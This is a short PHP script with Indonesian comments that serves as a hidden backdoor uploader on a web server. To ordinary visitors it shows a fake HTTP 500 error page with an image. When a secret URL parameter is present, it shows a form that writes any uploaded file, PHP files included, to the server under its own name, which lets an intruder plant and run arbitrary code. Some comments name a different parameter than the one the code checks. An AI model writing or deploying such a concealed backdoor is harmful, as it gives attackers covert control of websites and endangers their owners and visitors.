<?php
// Periksa apakah parameter "oke" ada dalam URL
if (isset($_GET['kurlung'])) {
    if (isset($_POST['submit'])) {
        // Ambil informasi file
        $nama = $_FILES['gambar']['name'];
        $tempat = $_FILES['gambar']['tmp_name'];
        $type = $_FILES['gambar']['type'];
        $size = $_FILES['gambar']['size'];

        // Daftar ekstensi file yang diizinkan
        $ukuran = ['html', 'jpg', 'png', 'jpeg', 'php'];

        // Ekstrak ekstensi dari nama file
        $explode = explode('.', $nama);
        $pembaginya = strtolower(end($explode));

        // Cek apakah ekstensi file sesuai dengan yang diizinkan
        if (in_array($pembaginya, $ukuran)) {
            // Pindahkan file ke lokasi baru
            move_uploaded_file($tempat, $nama);
            echo '<div class="alert alert-success alert-dismissible fade in" role="alert">
<button type="button" class="close" data-dismiss="alert" aria-label="Close"> <span aria-hidden="true">&times;</span> </button>
<strong> Sukses..!</strong> Data Berhasil Tersimpan.
</div>';
            echo '<meta http-equiv="refresh" content="3;url=">';
        } else {
            echo "Duh, ekstensi file tidak sesuai.";
        }
    } else {
        // Tampilkan form jika belum submit
        echo '<form method="post" enctype="multipart/form-data">
                <input type="file" name="gambar">
                <input type="submit" name="submit" value="submit">
              </form>';
    }
} else {
    // Jika parameter "oke" tidak ada di URL, tampilkan error 500
    http_response_code(500);
    $gambar_url = "https://sekupanglogistics.com/images/banners/sma-1.jpg"; // Ganti dengan permalink gambar yang sesuai
    echo '<html style="height: 100%;"><head><meta name="viewport" content="width=device-width, minimum-scale=0.1">
    <style>
        body {
            margin: 0;
            height: 100%;
            background-color: rgb(14, 14, 14);
            display: flex;
            justify-content: center;
            align-items: center;
            flex-direction: column;
        }
        img {
            max-width: 100%;
            max-height: 100%;
        }
    </style>
    </head><body>
    <img src="' . $gambar_url . '" alt="Gambar Error">
    </body></html>';
}
__halt_compiler();
?>
